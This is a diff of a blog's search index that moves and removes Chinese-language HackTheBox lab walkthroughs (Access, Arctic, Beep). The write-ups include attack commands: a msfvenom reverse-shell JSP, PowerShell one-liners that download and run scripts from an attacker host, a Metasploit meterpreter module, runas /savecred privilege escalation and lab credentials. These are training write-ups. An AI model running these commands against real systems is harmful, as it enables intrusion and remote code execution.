@@ -153,6 +153,102 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB:Access</title>
+    <url>/2020/10/25/HTB-Access/</url>
+    <content><![CDATA[<h1 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Access/1.png" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ftp允许匿名访问，下载它的全部内容先</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --mirror --no-passive-ftp &#39;ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.98&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Access/2.png" alt="2"></p>
+<p>nmap没有给出23端口的具体信息，可能知识根据端口号识别出了telnet，应该去手动检查它</p>
+<p><img src="/images/Access/3.png" alt="3"></p>
+<p>这样才确定了23的telnet服务</p>
+<p>80端口啥也没有</p>
+<p><img src="/images/Access/4.png" alt="4"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>优先去检查ftp的内容，发现一个<code>back.mdb</code>文件，这是一个Access数据库的文件，另外还有一个zip的压缩包</p>
+<p>unzip无法解压</p>
+<p><img src="/images/Access/5.png" alt="5"></p>
+<p>尝试使用7z</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x &#39;Access Control.zip&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Access/6.png" alt="6"></p>
+<p>需要密码，查看它的加密类型</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z l -slt &#39;Access Control.zip&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Access/7.png" alt="7"></p>
+<p>得到AES-256，7z和WinZip都支持AES-256算法</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip2john &#39;Access Control.zip&#39; &gt; hash</span><br><span class="line">john hash</span><br></pre></td></tr></table></figure>
+
+<p>这里无法破解，可能需要一个特殊的字典，有一个偷鸡的方法</p>
+<p>使用strings查看Access数据库的文件，发现</p>
+<p><img src="/images/Access/8.png" alt="8"></p>
+<p>存在一些可读的文本信息，提取出它们，为了减少大小，过滤掉8字符长度以下的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings -n 8 backup.mdb &gt;&#x2F;root&#x2F;Desktop&#x2F;list.txt</span><br></pre></td></tr></table></figure>
+
+<p>使用它们，你可以得到密码，神奇…</p>
+<p><img src="/images/Access/9.png" alt="9"></p>
+<h4 id="mdb"><a href="#mdb" class="headerlink" title="mdb"></a>mdb</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install mdbtools</span><br></pre></td></tr></table></figure>
+
+<p>使用它检查库的表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb-sql backup.mdb </span><br><span class="line">1 &#x3D;&gt; list tables</span><br><span class="line">2 &#x3D;&gt; go</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Access/10.png" alt="10"></p>
+<p>或者来查看<code>auth_user</code>表的内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb-export backup.mdb auth_user</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Access/11.png" alt="11"></p>
+<p>或者讲表内的内容逐一导出到文件中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir tables</span><br><span class="line">for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i &gt; tables&#x2F;$i; done</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Access/12.png" alt="12"></p>
+<p>所以可以在表内找到这个解压密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x &#39;Access Control.zip&#39;</span><br><span class="line">access4u@security</span><br></pre></td></tr></table></figure>
+
+<h4 id="outlook"><a href="#outlook" class="headerlink" title="outlook"></a>outlook</h4><p>解压后发现，是一个微软outlook的文件夹</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file &#39;Access Control.pst&#39; </span><br><span class="line">Access Control.pst: Microsoft Outlook email folder (&gt;&#x3D;2003)</span><br></pre></td></tr></table></figure>
+
+<p>可使用readpst转换成.mbox格式，再进行读取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install pst-utils</span><br><span class="line">readpst Access\ Control.pst</span><br><span class="line">cat &#39;Access Control.mbox&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Access/13.png" alt="13"></p>
+<p>得到凭据<code>security/4Cc3ssC0ntr0ller</code></p>
+<p>这样就能通过telnet获得shell</p>
+<p><img src="/images/Access/14.png" alt="14"></p>
+<p>想要换一个环境的shell，尝试使用nc，但是会被本地组策略阻止</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This program is blocked by group policy. For more information, contact your system administrator</span><br></pre></td></tr></table></figure>
+
+<p>使用powershell Nishang的InvokeTCP就可以了</p>
+<p><img src="/images/Access/16.png" alt="16"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权有点难受，powerup会卡住，winpeas不能用，不过练练手动枚举也挺好</p>
+<p>发现了管理员的Saved Creds</p>
+<p><img src="/images/Access/17.png" alt="17"></p>
+<p>通过它可以随心所欲，无视本地策略组了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runas &#x2F;savecred &#x2F;user:Administrator &quot;.\shell.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Access/18.png" alt="18"></p>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p><code>powerup</code>无法使用，但是<code>jaws</code>可以使用，使用它可以得到相同的结果</p>
+<p><img src="/images/Access/19.png" alt="19"></p>
+<p>为什么这里会有存储的凭据，可能是管理员希望某个程序能够以管理员身份运行，配置了/savecred<br>在windows中无法为单个程序设置使用/savecred，所以能够以runas运行任何命令<br>通常/savecred runas用于创建快捷方式，让用户以高权限运行，可以在进行<code>.lnk</code>快捷方式的枚举，发现是否存在runas命令，不过好像只有GUI下可以运行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-ChildItem &quot;C:\&quot; *.lnk -Recurse -Force | ft fullname |Out-File shortcuts.txt</span><br><span class="line">ForEach($file in gc .\shortcuts.txt) &#123; Write-Output $file; gc $file |Select-String runas &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样可以发现</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk</span><br></pre></td></tr></table></figure>
+
+<p>可以使用powershell来获取快捷方式的详细信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$WScript&#x3D;New-Object -ComObject  WScript.Shell</span><br><span class="line">$shortcut&#x3D;Get-ChildItem *.lnk</span><br><span class="line">$WScript.CreateShortcut($shortcut)</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FullName         : C:\Users\public\Desktop\ZKAccess3.5 Security System.lnk</span><br><span class="line">Arguments        : &#x2F;user:ACCESS\Administrator &#x2F;savecred &quot;C:\ZKTeco\ZKAccess3.5\</span><br><span class="line">                   Access.exe&quot;</span><br><span class="line">Description      : </span><br><span class="line">Hotkey           : </span><br><span class="line">IconLocation     : C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico,0</span><br><span class="line">RelativePath     : </span><br><span class="line">TargetPath       : C:\Windows\System32\runas.exe</span><br><span class="line">WindowStyle      : 1</span><br><span class="line">WorkingDirectory : C:\ZKTeco\ZKAccess3.5</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Windows靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB:Academy</title>
     <url>/2020/11/28/HTB-Academy/</url>
     <content><![CDATA[<h1 id="Academy"><a href="#Academy" class="headerlink" title="Academy"></a>Academy</h1><p>添加hosts</p>
@@ -325,102 +421,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB:Access</title>
-    <url>/2020/10/25/HTB-Access/</url>
-    <content><![CDATA[<h1 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Access/1.png" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ftp允许匿名访问，下载它的全部内容先</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --mirror --no-passive-ftp &#39;ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.98&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Access/2.png" alt="2"></p>
-<p>nmap没有给出23端口的具体信息，可能知识根据端口号识别出了telnet，应该去手动检查它</p>
-<p><img src="/images/Access/3.png" alt="3"></p>
-<p>这样才确定了23的telnet服务</p>
-<p>80端口啥也没有</p>
-<p><img src="/images/Access/4.png" alt="4"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>优先去检查ftp的内容，发现一个<code>back.mdb</code>文件，这是一个Access数据库的文件，另外还有一个zip的压缩包</p>
-<p>unzip无法解压</p>
-<p><img src="/images/Access/5.png" alt="5"></p>
-<p>尝试使用7z</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x &#39;Access Control.zip&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Access/6.png" alt="6"></p>
-<p>需要密码，查看它的加密类型</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z l -slt &#39;Access Control.zip&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Access/7.png" alt="7"></p>
-<p>得到AES-256，7z和WinZip都支持AES-256算法</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip2john &#39;Access Control.zip&#39; &gt; hash</span><br><span class="line">john hash</span><br></pre></td></tr></table></figure>
-
-<p>这里无法破解，可能需要一个特殊的字典，有一个偷鸡的方法</p>
-<p>使用strings查看Access数据库的文件，发现</p>
-<p><img src="/images/Access/8.png" alt="8"></p>
-<p>存在一些可读的文本信息，提取出它们，为了减少大小，过滤掉8字符长度以下的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings -n 8 backup.mdb &gt;&#x2F;root&#x2F;Desktop&#x2F;list.txt</span><br></pre></td></tr></table></figure>
-
-<p>使用它们，你可以得到密码，神奇…</p>
-<p><img src="/images/Access/9.png" alt="9"></p>
-<h4 id="mdb"><a href="#mdb" class="headerlink" title="mdb"></a>mdb</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install mdbtools</span><br></pre></td></tr></table></figure>
-
-<p>使用它检查库的表名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb-sql backup.mdb </span><br><span class="line">1 &#x3D;&gt; list tables</span><br><span class="line">2 &#x3D;&gt; go</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Access/10.png" alt="10"></p>
-<p>或者来查看<code>auth_user</code>表的内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb-export backup.mdb auth_user</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Access/11.png" alt="11"></p>
-<p>或者讲表内的内容逐一导出到文件中</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir tables</span><br><span class="line">for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i &gt; tables&#x2F;$i; done</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Access/12.png" alt="12"></p>
-<p>所以可以在表内找到这个解压密码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x &#39;Access Control.zip&#39;</span><br><span class="line">access4u@security</span><br></pre></td></tr></table></figure>
-
-<h4 id="outlook"><a href="#outlook" class="headerlink" title="outlook"></a>outlook</h4><p>解压后发现，是一个微软outlook的文件夹</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file &#39;Access Control.pst&#39; </span><br><span class="line">Access Control.pst: Microsoft Outlook email folder (&gt;&#x3D;2003)</span><br></pre></td></tr></table></figure>
-
-<p>可使用readpst转换成.mbox格式，再进行读取</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install pst-utils</span><br><span class="line">readpst Access\ Control.pst</span><br><span class="line">cat &#39;Access Control.mbox&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Access/13.png" alt="13"></p>
-<p>得到凭据<code>security/4Cc3ssC0ntr0ller</code></p>
-<p>这样就能通过telnet获得shell</p>
-<p><img src="/images/Access/14.png" alt="14"></p>
-<p>想要换一个环境的shell，尝试使用nc，但是会被本地组策略阻止</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This program is blocked by group policy. For more information, contact your system administrator</span><br></pre></td></tr></table></figure>
-
-<p>使用powershell Nishang的InvokeTCP就可以了</p>
-<p><img src="/images/Access/16.png" alt="16"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权有点难受，powerup会卡住，winpeas不能用，不过练练手动枚举也挺好</p>
-<p>发现了管理员的Saved Creds</p>
-<p><img src="/images/Access/17.png" alt="17"></p>
-<p>通过它可以随心所欲，无视本地策略组了</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runas &#x2F;savecred &#x2F;user:Administrator &quot;.\shell.exe&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Access/18.png" alt="18"></p>
-<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p><code>powerup</code>无法使用，但是<code>jaws</code>可以使用，使用它可以得到相同的结果</p>
-<p><img src="/images/Access/19.png" alt="19"></p>
-<p>为什么这里会有存储的凭据，可能是管理员希望某个程序能够以管理员身份运行，配置了/savecred<br>在windows中无法为单个程序设置使用/savecred，所以能够以runas运行任何命令<br>通常/savecred runas用于创建快捷方式，让用户以高权限运行，可以在进行<code>.lnk</code>快捷方式的枚举，发现是否存在runas命令，不过好像只有GUI下可以运行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-ChildItem &quot;C:\&quot; *.lnk -Recurse -Force | ft fullname |Out-File shortcuts.txt</span><br><span class="line">ForEach($file in gc .\shortcuts.txt) &#123; Write-Output $file; gc $file |Select-String runas &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样可以发现</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk</span><br></pre></td></tr></table></figure>
-
-<p>可以使用powershell来获取快捷方式的详细信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$WScript&#x3D;New-Object -ComObject  WScript.Shell</span><br><span class="line">$shortcut&#x3D;Get-ChildItem *.lnk</span><br><span class="line">$WScript.CreateShortcut($shortcut)</span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FullName         : C:\Users\public\Desktop\ZKAccess3.5 Security System.lnk</span><br><span class="line">Arguments        : &#x2F;user:ACCESS\Administrator &#x2F;savecred &quot;C:\ZKTeco\ZKAccess3.5\</span><br><span class="line">                   Access.exe&quot;</span><br><span class="line">Description      : </span><br><span class="line">Hotkey           : </span><br><span class="line">IconLocation     : C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico,0</span><br><span class="line">RelativePath     : </span><br><span class="line">TargetPath       : C:\Windows\System32\runas.exe</span><br><span class="line">WindowStyle      : 1</span><br><span class="line">WorkingDirectory : C:\ZKTeco\ZKAccess3.5</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Windows靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB:Active</title>
     <url>/2020/07/02/HTB-Active/</url>
     <content><![CDATA[<p>域渗透相关机器，利用了windows server 2008中gpp存储密码的安全风险</p>
@@ -522,60 +522,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB:Arctic</title>
-    <url>/2020/06/12/HTB-Arctic/</url>
-    <content><![CDATA[<h1 id="Arctic"><a href="#Arctic" class="headerlink" title="Arctic"></a>Arctic</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Arctic/1.jpg" alt="1"></p>
-<p>端口开放的很奇怪</p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Arctic/2.jpg" alt="2"></p>
-<p>8500端口是个目录，看看能发现什么</p>
-<p><img src="/images/Arctic/3.jpg" alt="3"></p>
-<p>发现了coldfusion 8的后台地址</p>
-<p>搜寻公开漏洞</p>
-<p><img src="/images/Arctic/4.jpg" alt="4"></p>
-<p>发现了一个目录遍历</p>
-<p><img src="/images/Arctic/5.jpg" alt="5"></p>
-<p>利用它可以读取后台密码md5</p>
-<p><img src="/images/Arctic/6.jpg" alt="6"></p>
-<p>解密后是<code>happyday</code></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/Arctic/7.jpg" alt="7"></p>
-<p>成功找到上传点<br>生成木马</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.16.123 LPORT&#x3D;4444 -f raw -o evil.jsp</span><br></pre></td></tr></table></figure>
-
-<p>不过上传需要填写对端文件和本地保存路径</p>
-<p><img src="/images/Arctic/9.jpg" alt="9"></p>
-<p>好在可以在<code>mappings</code>里找到</p>
-<p><img src="/images/Arctic/8.jpg" alt="8"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\ColdFusion8\wwwroot\CFIDE\evil.jsp</span><br></pre></td></tr></table></figure>
-
-<p>最后要勾上<code>Save output to a file</code></p>
-<p><img src="/images/Arctic/10.jpg" alt="10"></p>
-<p>之后我们的shell就成功上传了</p>
-<p><img src="/images/Arctic/11.jpg" alt="11"></p>
-<p><img src="/images/Arctic/12.jpg" alt="12"></p>
-<p>成功获取shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>获取powershell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.173&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Arctic/13.jpg" alt="13"></p>
-<p>执行提权脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.173&#x2F;winpriv&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Arctic/14.jpg" alt="14"></p>
-<h3 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15-051"></a>ms15-051</h3><p><img src="/images/Arctic/15.jpg" alt="15"></p>
-<p>提权成功</p>
-<h3 id="ms10-059"><a href="#ms10-059" class="headerlink" title="ms10-059"></a>ms10-059</h3><p><img src="/images/Arctic/16.jpg" alt="16"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\Chimichurri.exe 10.10.16.173 5555</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Arctic/17.jpg" alt="17"></p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Windows靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB:Bank</title>
     <url>/2020/10/19/HTB-Bank/</url>
     <content><![CDATA[<h1 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bank/1.png" alt="1"></p>
@@ -645,6 +591,60 @@
       </categories>
       <tags>
         <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB:Arctic</title>
+    <url>/2020/06/12/HTB-Arctic/</url>
+    <content><![CDATA[<h1 id="Arctic"><a href="#Arctic" class="headerlink" title="Arctic"></a>Arctic</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Arctic/1.jpg" alt="1"></p>
+<p>端口开放的很奇怪</p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Arctic/2.jpg" alt="2"></p>
+<p>8500端口是个目录，看看能发现什么</p>
+<p><img src="/images/Arctic/3.jpg" alt="3"></p>
+<p>发现了coldfusion 8的后台地址</p>
+<p>搜寻公开漏洞</p>
+<p><img src="/images/Arctic/4.jpg" alt="4"></p>
+<p>发现了一个目录遍历</p>
+<p><img src="/images/Arctic/5.jpg" alt="5"></p>
+<p>利用它可以读取后台密码md5</p>
+<p><img src="/images/Arctic/6.jpg" alt="6"></p>
+<p>解密后是<code>happyday</code></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/Arctic/7.jpg" alt="7"></p>
+<p>成功找到上传点<br>生成木马</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.16.123 LPORT&#x3D;4444 -f raw -o evil.jsp</span><br></pre></td></tr></table></figure>
+
+<p>不过上传需要填写对端文件和本地保存路径</p>
+<p><img src="/images/Arctic/9.jpg" alt="9"></p>
+<p>好在可以在<code>mappings</code>里找到</p>
+<p><img src="/images/Arctic/8.jpg" alt="8"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\ColdFusion8\wwwroot\CFIDE\evil.jsp</span><br></pre></td></tr></table></figure>
+
+<p>最后要勾上<code>Save output to a file</code></p>
+<p><img src="/images/Arctic/10.jpg" alt="10"></p>
+<p>之后我们的shell就成功上传了</p>
+<p><img src="/images/Arctic/11.jpg" alt="11"></p>
+<p><img src="/images/Arctic/12.jpg" alt="12"></p>
+<p>成功获取shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>获取powershell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.173&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Arctic/13.jpg" alt="13"></p>
+<p>执行提权脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.173&#x2F;winpriv&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Arctic/14.jpg" alt="14"></p>
+<h3 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15-051"></a>ms15-051</h3><p><img src="/images/Arctic/15.jpg" alt="15"></p>
+<p>提权成功</p>
+<h3 id="ms10-059"><a href="#ms10-059" class="headerlink" title="ms10-059"></a>ms10-059</h3><p><img src="/images/Arctic/16.jpg" alt="16"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\Chimichurri.exe 10.10.16.173 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Arctic/17.jpg" alt="17"></p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Windows靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -791,65 +791,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB:Beep</title>
-    <url>/2020/06/11/HTB-Beep/</url>
-    <content><![CDATA[<h1 id="Beep"><a href="#Beep" class="headerlink" title="Beep"></a>Beep</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Beep/1.jpg" alt="1"></p>
-<p>扫出了很多端口</p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Beep/2.jpg" alt="2"></p>
-<p>web服务:elastix</p>
-<p><img src="/images/Beep/3.jpg" alt="3"></p>
-<p>之后对目录进行扫描</p>
-<p><img src="/images/Beep/4.jpg" alt="4"></p>
-<p>还发现了FreePBX</p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1-文件包含"><a href="#方法1-文件包含" class="headerlink" title="方法1:文件包含"></a>方法1:文件包含</h3><p>searchsploit</p>
-<p> <img src="/images/Beep/6.jpg" alt="6"></p>
-<p>37637.pl</p>
-<p><img src="/images/Beep/5.jpg" alt="5"></p>
-<p><img src="/images/Beep/7.jpg" alt="7"></p>
-<p>发现文件包含成功了，现在读取的<code>/etc/amportal.conf</code> 是FreePBX的配置文件</p>
-<p><img src="/images/Beep/8.jpg" alt="8"></p>
-<p>我们还可以读取一下<code>/etc/asterisk/manager.conf</code>，这是FreePBX连接asterisk的管理密码</p>
-<p><img src="/images/Beep/9.jpg" alt="9"></p>
-<p>最后再读取一下/etc/passwd</p>
-<p><img src="/images/Beep/10.jpg" alt="10"></p>
-<p>获取拥有bash的用户，最后排列组合用户名和获取的密码尝试</p>
-<p>期间ssh还遇到了不支持sha1的问题，需要手动开启</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;ssh_config												&#x2F;&#x2F;不需要重启</span><br><span class="line">MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160			&#x2F;&#x2F;删掉注释</span><br><span class="line">HostkeyAlgorithms ssh-dss,ssh-rsa									&#x2F;&#x2F;末尾添加</span><br><span class="line">KexAlgorithms +diffie-hellman-group1-sha1							&#x2F;&#x2F;末尾添加</span><br></pre></td></tr></table></figure>
-
-<p>最后使用账号/密码<code>root/jEhdIekWmdjE</code>，成功登录，还是root权限</p>
-<p><img src="/images/Beep/11.jpg" alt="11"></p>
-<h3 id="方法2-RCE"><a href="#方法2-RCE" class="headerlink" title="方法2:RCE"></a>方法2:RCE</h3><p><img src="/images/Beep/12.jpg" alt="12"></p>
-<p>Elastix存在RCE漏洞，不过直接运行18650.py会出现SSL证书错误</p>
-<p>可以利用burp强制tls转发</p>
-<p><img src="/images/Beep/13.jpg" alt="13"></p>
-<p>接着使用svwar扫描SIP线路</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install sipvicious</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Beep/15.jpg" alt="15"></p>
-<p>修改EXP</p>
-<p><img src="/images/Beep/14.jpg" alt="14"></p>
-<p>之后就可以获取shell</p>
-<p><img src="/images/Beep/16.jpg" alt="16"></p>
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="/images/Beep/17.jpg" alt="17"></p>
-<p>利用nmap提权</p>
-<p><img src="/images/Beep/18.jpg" alt="18"></p>
-<h3 id="方法3-msf"><a href="#方法3-msf" class="headerlink" title="方法3:msf"></a>方法3:msf</h3><p>使用字典<code>directory-list-2.3-medium.txt</code>发现目录<code>vtigercrm</code>版本5.1.0</p>
-<p><img src="/images/Beep/19.jpg" alt="19"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload</span><br><span class="line">set RHOSTS 10.10.10.7</span><br><span class="line">set SSL true</span><br><span class="line">set RPORT 443</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST tun0</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
-
-<p>如果遇到SSL错误，是因为openssl版本太高不支持低版本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OpenSSL::SSL::SSLError SSL_connect returned&#x3D;1 errno&#x3D;0 state&#x3D;error: dh key too small</span><br></pre></td></tr></table></figure>
-
-<p>可以修改/etc/ssl/openssl.cnf，或者像之前一样，用burp转发解决</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[system_default_sect]</span><br><span class="line">MinProtocol = TLSv1<span class="number">.2</span></span><br><span class="line">CipherString = DEFAULT@SECLEVEL=<span class="number">2</span></span><br><span class="line"><span class="comment">//修改</span></span><br><span class="line">[system_default_sect]</span><br><span class="line">MinProtocol = None</span><br><span class="line">CipherString = DEFAULT</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB:Bastard</title>
